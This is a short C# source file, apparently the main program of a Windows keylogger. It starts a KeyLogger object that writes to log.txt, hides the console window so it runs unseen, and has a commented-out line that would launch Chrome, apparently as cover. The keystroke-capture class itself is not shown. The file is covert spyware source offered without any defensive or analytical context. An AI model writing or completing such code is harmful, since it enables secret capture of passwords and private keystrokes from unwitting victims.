using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Hooks
{

    class Program
    {

        static void Main(string[] args)
        {
            var handle = GetConsoleWindow();

            var kl = new KeyLogger(Application.StartupPath + @"\log.txt");
            // Hide
            ShowWindow(handle, SW_HIDE);
            //Process.Start("C:\\Program Files (x86)\\Google\\Chrome\\Application\\Chrome.exe");

            Application.Run();
            kl.Deactivate();
            
        }

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
    }
}
